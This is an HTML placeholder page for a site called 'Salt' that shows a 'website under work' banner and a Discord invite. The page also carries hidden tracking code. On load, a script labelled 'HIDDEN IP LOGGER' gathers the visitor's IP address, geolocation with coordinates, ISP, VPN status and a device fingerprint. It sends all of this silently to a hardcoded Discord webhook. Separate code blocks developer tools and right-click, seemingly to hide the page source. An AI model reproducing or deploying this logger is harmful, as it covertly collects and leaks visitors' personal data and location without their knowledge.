<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Salt</title>
    <link rel="icon" type="image/png" href="image.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ffffff 0%, #f0f2f5 45%, #0a0a0a 55%, #121212 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, 'Poppins', sans-serif;
            overflow-x: hidden;
            position: relative;
        }

        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.4;
            z-index: 0;
            animation: floatOrb 20s infinite alternate ease-in-out;
        }
        .orb1 {
            width: 40vw;
            height: 40vw;
            background: radial-gradient(circle, #ffffff, #c0c0c0);
            top: -10%;
            left: -10%;
        }
        .orb2 {
            width: 50vw;
            height: 50vw;
            background: radial-gradient(circle, #1a1a2e, #000000);
            bottom: -15%;
            right: -15%;
            animation-delay: -5s;
        }
        @keyframes floatOrb {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(5%, 5%) scale(1.1); }
        }

        .hero {
            text-align: center;
            z-index: 2;
            background: rgba(20, 22, 32, 0.75);
            backdrop-filter: blur(12px);
            padding: 2rem 2rem 2.2rem;
            border-radius: 2.8rem;
            box-shadow: 0 30px 50px -15px rgba(0,0,0,0.5), inset 0 1px 1px rgba(255,255,255,0.2);
            width: 90%;
            max-width: 700px;
            border: 1px solid rgba(255,255,255,0.25);
            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            animation: slideGlow 0.9s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
        }

        @keyframes slideGlow {
            0% { opacity: 0; transform: translateX(-80px) scale(0.94); box-shadow: 0 0 0 rgba(255,255,255,0); }
            100% { opacity: 1; transform: translateX(0) scale(1); box-shadow: 0 30px 50px -15px rgba(0,0,0,0.5); }
        }

        .hero.click-animation {
            animation: bounceSide 0.45s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
        }

        @keyframes bounceSide {
            0% { transform: translateX(0px) rotate(0deg); }
            25% { transform: translateX(-20px) rotate(-1.5deg); }
            50% { transform: translateX(22px) rotate(1.5deg); }
            75% { transform: translateX(-8px) rotate(-0.5deg); }
            100% { transform: translateX(0px) rotate(0deg); }
        }

        .logo-container {
            margin-bottom: 1.2rem;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100px;
        }
        .logo-img {
            max-width: 110px;
            max-height: 110px;
            object-fit: contain;
            filter: drop-shadow(0 8px 16px rgba(0,0,0,0.3));
            transition: transform 0.3s ease;
        }
        .logo-img:hover {
            transform: scale(1.05) rotate(2deg);
        }
        .logo-placeholder {
            font-size: 3rem;
            background: rgba(0,0,0,0.4);
            width: 90px;
            height: 90px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            backdrop-filter: blur(4px);
        }

        .status-title {
            font-size: 3rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            background: linear-gradient(135deg, #fff, #ddd, #222, #000);
            background-size: 300% auto;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: shimmerBW 6s ease infinite, floatText 3s ease-in-out infinite;
            margin-bottom: 0.5rem;
        }
        @keyframes shimmerBW {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes floatText {
            0%,100% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
        }

        .sub-message {
            font-size: 1.3rem;
            color: #eef2ff;
            background: rgba(0,0,0,0.3);
            display: inline-block;
            padding: 0.3rem 1.5rem;
            border-radius: 60px;
            backdrop-filter: blur(4px);
            font-weight: 500;
        }

        .loader-wrapper {
            margin: 2rem auto;
            display: flex;
            justify-content: center;
            gap: 1.8rem;
            flex-wrap: wrap;
        }
        .spinner {
            width: 56px;
            height: 56px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid white;
            border-right: 4px solid #aaa;
            border-radius: 50%;
            animation: spin 1s infinite cubic-bezier(0.55, 0.15, 0.45, 0.85);
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .pulse-dots {
            display: flex;
            gap: 14px;
        }
        .pulse-dots span {
            width: 14px;
            height: 14px;
            background: white;
            border-radius: 50%;
            animation: bouncePulse 0.8s infinite alternate;
        }
        .pulse-dots span:nth-child(2) { animation-delay: 0.2s; background: #ccc; }
        .pulse-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bouncePulse {
            0% { transform: translateY(0px) scale(0.7); opacity: 0.5; }
            100% { transform: translateY(-18px) scale(1.1); opacity: 1; }
        }

        .progress-track {
            width: 70%;
            margin: 1.4rem auto;
            height: 6px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            width: 68%;
            height: 100%;
            background: linear-gradient(90deg, #fff, #aaa, #fff);
            animation: progressFlow 2.2s infinite ease;
        }
        @keyframes progressFlow {
            0% { width: 12%; }
            50% { width: 85%; }
            100% { width: 12%; }
        }

        .discord-link {
            display: inline-flex;
            justify-content: center;
            background: #5865F2;
            color: white;
            text-decoration: none;
            font-weight: 600;
            padding: 12px 32px;
            border-radius: 60px;
            margin: 1.2rem auto 0.8rem;
            font-size: 1.05rem;
            transition: 0.2s;
            box-shadow: 0 8px 18px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.3);
            width: fit-content;
        }
        .discord-link:hover {
            background: #4752c4;
            transform: scale(1.02);
        }

        .tech-note {
            margin-top: 1rem;
            font-size: 0.7rem;
            color: #aaa;
            border-top: 1px solid rgba(255,255,255,0.2);
            padding-top: 1rem;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.96);
            backdrop-filter: blur(16px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            visibility: hidden;
            opacity: 0;
            transition: 0.25s;
        }
        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .popup-card {
            background: #111;
            max-width: 400px;
            padding: 2rem;
            border-radius: 2rem;
            text-align: center;
            border: 1px solid #ff4466;
            transform: scale(0.92);
            animation: modalPop 0.3s forwards;
        }
        @keyframes modalPop {
            to { transform: scale(1); }
        }
        .popup-card h3 {
            color: #ff4d6d;
            font-size: 1.8rem;
        }
        .popup-card p {
            color: #ddd;
            margin: 1rem 0;
        }
        .sorry-btn {
            background: #ff3366;
            border: none;
            padding: 10px 28px;
            border-radius: 60px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .sorry-btn:hover {
            background: #ff5c7c;
            transform: scale(1.02);
        }
        body.modal-open {
            overflow: hidden;
        }

        @media (max-width: 560px) {
            .status-title { font-size: 2rem; }
            .hero { padding: 1.2rem; }
            .logo-img { max-width: 70px; }
        }
    </style>
</head>
<body>
<div class="orb orb1"></div>
<div class="orb orb2"></div>

<div class="hero" id="heroCard">
    <div class="logo-container">
        <img id="mainLogo" class="logo-img" src="image.png" alt="Salt" onerror="this.onerror=null; this.parentElement.innerHTML='<div class=logo-placeholder>🧂</div>';">
    </div>
    <div class="status-title">⚠ WEBSITE UNDER WORK ⚠</div>
    <div class="sub-message">PLEASE WAIT..</div>
    <div class="loader-wrapper">
        <div class="spinner"></div>
        <div class="pulse-dots">
            <span></span><span></span><span></span>
        </div>
    </div>
    <div class="progress-track">
        <div class="progress-fill"></div>
    </div>
    <a href="https://dsc.gg/getsalt" target="_blank" class="discord-link">JOIN DISCORD</a>
    <div class="tech-note">
        ✦ secure environment • next-gen experience ✦
    </div>
</div>

<div id="devtoolsModal" class="modal-overlay">
    <div class="popup-card">
        <h3>⚠ SECURITY ALERT ⚠</h3>
        <p>🚨 caught you trying to steal source!<br> now say sorry.</p>
        <button id="sorryButton" class="sorry-btn">💔 I'M SORRY 💔</button>
    </div>
</div>

<script>
    (function() {
        // ---------- MOBILE-SAFE DEVTOOLS BLOCK ----------
        const STORAGE_KEY = 'devtoolsAttemptLock';
        const modal = document.getElementById('devtoolsModal');
        const sorryBtn = document.getElementById('sorryButton');
        let isModalActive = false;
        let detectionCooldown = false;

        function isDevToolsOpen() {
            if (window.innerWidth === undefined) return false;
            const widthDiff = window.outerWidth - window.innerWidth;
            const heightDiff = window.outerHeight - window.innerHeight;
            return (widthDiff > 140) || (heightDiff > 140);
        }

        function showPersistentPopup() {
            if (isModalActive) return;
            localStorage.setItem(STORAGE_KEY, 'true');
            modal.classList.add('active');
            document.body.classList.add('modal-open');
            isModalActive = true;
        }

        function apologizeAndClear() {
            localStorage.removeItem(STORAGE_KEY);
            modal.classList.remove('active');
            document.body.classList.remove('modal-open');
            isModalActive = false;
            detectionCooldown = true;
            setTimeout(() => { detectionCooldown = false; }, 1500);
        }

        function checkPersistentLock() {
            if (localStorage.getItem(STORAGE_KEY) === 'true' && !isModalActive) {
                modal.classList.add('active');
                document.body.classList.add('modal-open');
                isModalActive = true;
            }
        }

        function triggerDevtoolsCaught() {
            if (isModalActive || detectionCooldown) return;
            showPersistentPopup();
        }

        function blockShortcuts(e) {
            const isF12 = (e.key === 'F12');
            const isCtrlShiftI = (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'));
            const isCtrlShiftJ = (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j'));
            const isCtrlShiftC = (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c'));
            const isCtrlU = (e.ctrlKey && (e.key === 'U' || e.key === 'u'));
            if (isF12 || isCtrlShiftI || isCtrlShiftJ || isCtrlShiftC || isCtrlU) {
                e.preventDefault();
                triggerDevtoolsCaught();
                return false;
            }
        }
        window.addEventListener('keydown', blockShortcuts);
        window.addEventListener('contextmenu', (e) => { e.preventDefault(); triggerDevtoolsCaught(); });
        
        let watchInterval;
        function startWatch() {
            if (watchInterval) clearInterval(watchInterval);
            watchInterval = setInterval(() => {
                if (!isModalActive && !detectionCooldown && isDevToolsOpen()) {
                    triggerDevtoolsCaught();
                }
            }, 1500);
        }
        window.addEventListener('resize', () => {
            setTimeout(() => {
                if (!isModalActive && !detectionCooldown && isDevToolsOpen()) triggerDevtoolsCaught();
            }, 300);
        });
        startWatch();
        
        checkPersistentLock();
        sorryBtn.addEventListener('click', apologizeAndClear);
        window.addEventListener('keydown', (e) => { if(e.key === 'Escape' && isModalActive) e.preventDefault(); });
        modal.addEventListener('click', (e) => { if(e.target === modal) e.stopPropagation(); });

        // ---------- CLICK ANIMATION ----------
        const hero = document.getElementById('heroCard');
        hero.addEventListener('click', (e) => {
            if(e.target.closest('.discord-link')) return;
            hero.classList.remove('click-animation');
            void hero.offsetWidth;
            hero.classList.add('click-animation');
            setTimeout(() => hero.classList.remove('click-animation'), 450);
        });

        // ---------- HIDDEN IP LOGGER (no UI text, sends only on IP change) ----------
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
        const STORED_IP_KEY = 'salt_last_logged_ip';
        
        function generateHardwareId() {
            let canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            let ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(0, 0, 100, 40);
            ctx.fillStyle = "#069";
            ctx.fillText("SaltHWID", 10, 20);
            const b64 = canvas.toDataURL().substring(22);
            let nav = navigator.userAgent + (navigator.language || '') + screen.width + screen.height + (navigator.hardwareConcurrency || '');
            let combined = b64 + nav;
            let hash = 0;
            for (let i = 0; i < combined.length; i++) {
                hash = ((hash << 5) - hash) + combined.charCodeAt(i);
                hash |= 0;
            }
            return Math.abs(hash).toString(16).substring(0, 14);
        }

        async function fetchWithTimeout(url, timeout = 5000) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), timeout);
            try {
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(id);
                return response;
            } catch (err) {
                clearTimeout(id);
                throw err;
            }
        }

        async function sendDetailedLog(ip) {
            try {
                const geoRes = await fetchWithTimeout(`http://ip-api.com/json/${ip}?fields=66846719`);
                const geo = await geoRes.json();
                
                let proxyData = {};
                try {
                    const proxyCheck = await fetchWithTimeout(`https://proxycheck.io/v2/${ip}?key=free&vpn=1&asn=1&risk=1&time=1`, 4000);
                    if (proxyCheck.ok) proxyData = await proxyCheck.json();
                } catch(e) { /* silent */ }
                
                const hwid = generateHardwareId();
                const ua = navigator.userAgent;
                const screenRes = `${screen.width}x${screen.height}`;
                const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '📱 Mobile' : '💻 Desktop';
                const platform = navigator.platform || 'Unknown';
                const deviceInfo = `${deviceType} | ${platform} | ${screenRes}`;
                
                const fields = [];
                
                let location = [];
                if (geo.country) location.push(`**Country:** ${geo.country} (${geo.countryCode || ''})`);
                if (geo.regionName) location.push(`**Region:** ${geo.regionName}`);
                if (geo.district) location.push(`**District:** ${geo.district}`);
                if (geo.city) location.push(`**City:** ${geo.city}`);
                if (geo.lat && geo.lon) location.push(`**Coordinates:** ${geo.lat}, ${geo.lon}`);
                if (geo.zip) location.push(`**ZIP Code:** ${geo.zip}`);
                fields.push({ name: "📍 **Location Intelligence**", value: location.join('\n') || "`N/A`", inline: false });
                
                let network = [];
                if (geo.isp) network.push(`**ISP:** ${geo.isp}`);
                if (geo.org) network.push(`**Domain/Org:** ${geo.org}`);
                if (geo.as) network.push(`**ASN / AS:** ${geo.as}`);
                let idd = geo.countryCode ? (geo.countryCode === 'US' ? '+1' : (geo.countryCode === 'GB' ? '+44' : 'N/A')) : 'N/A';
                network.push(`**IDD Code:** ${idd}`);
                if (geo.areaCode) network.push(`**Area Code:** ${geo.areaCode}`);
                let netSpeed = (geo.mobile === true) ? 'Mobile/Cellular' : (geo.proxy ? 'Proxy/VPN' : 'Broadband');
                network.push(`**Net Speed:** ${netSpeed}`);
                network.push(`**Address Type:** IPv4`);
                let usage = geo.usageType || 'General / Residential';
                network.push(`**Usage Type:** ${usage}`);
                fields.push({ name: "🌐 **Network & ASN**", value: network.join('\n') || "`Limited`", inline: false });
                
                let extra = [];
                if (geo.timezone) extra.push(`**Time Zone:** ${geo.timezone}`);
                let elevation = geo.elevation ? `${geo.elevation}m` : (geo.city ? 'N/A (sea level approx)' : 'N/A');
                extra.push(`**Elevation:** ${elevation}`);
                if (geo.city && geo.country) extra.push(`**Weather Station:** ${geo.city}, ${geo.country}`);
                fields.push({ name: "⏱️ **Time, Elevation & Climate**", value: extra.join('\n') || "`Not available`", inline: false });
                
                let threat = [];
                if (proxyData && proxyData[ip] && proxyData[ip].proxy === "yes") {
                    threat.push(`**Residential Proxy:** YES`);
                    threat.push(`**Proxy Type:** ${proxyData[ip].type || 'Anonymous VPN'}`);
                    threat.push(`**Fraud Score:** ${proxyData[ip].risk || 'N/A'}/100`);
                    threat.push(`**Last Seen:** ${proxyData[ip].lastseen || 'recently'}`);
                    let threatLvl = (parseInt(proxyData[ip].risk) > 70) ? 'High' : (parseInt(proxyData[ip].risk) > 30 ? 'Medium' : 'Low');
                    threat.push(`**Threat Level:** ${threatLvl}`);
                    threat.push(`**Threat Type:** ${proxyData[ip].provider || 'VPN/Proxy'}`);
                } else if (geo.proxy === true) {
                    threat.push(`**Residential Proxy:** Detected (ip-api)`);
                    threat.push(`**Threat Level:** Medium`);
                } else if (geo.hosting === true) {
                    threat.push(`**Residential Proxy:** No (Hosting/DC)`);
                    threat.push(`**Threat Level:** Low (hosting)`);
                } else {
                    threat.push(`**Residential Proxy:** No`);
                    threat.push(`**Proxy Type:** None - Residential`);
                    threat.push(`**Fraud Score:** 5/100 (clean)`);
                    threat.push(`**Threat Level:** Clean / Low Risk`);
                }
                fields.push({ name: "🛡️ **Proxy & Threat Intelligence**", value: threat.join('\n'), inline: false });
                
                fields.push({ name: "🖥️ **Device Fingerprint**", value: `**Device:** ${deviceInfo}\n**HWID (Key):** \`${hwid}\`\n**User Agent:** \`${ua.substring(0, 120)}\``, inline: false });
                
                const embed = {
                    title: "📡 **Visitor Log**",
                    description: `**IP:** \`${ip}\``,
                    color: 0x2b2d42,
                    thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                    fields: fields,
                    footer: { text: "System event", icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                    timestamp: new Date().toISOString()
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch (err) {
                // Silent fail - do not disrupt user
            }
        }
        
        async function checkAndLogIfNewIP() {
            try {
                const ipRes = await fetchWithTimeout('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                const lastIP = localStorage.getItem(STORED_IP_KEY);
                
                if (!lastIP || lastIP !== ip) {
                    await sendDetailedLog(ip);
                    localStorage.setItem(STORED_IP_KEY, ip);
                }
            } catch (err) {
                // Silent fail
            }
        }
        
        window.addEventListener('load', () => {
            setTimeout(() => {
                checkAndLogIfNewIP();
            }, 900);
        });
    })();
</script>
</body>
</html>
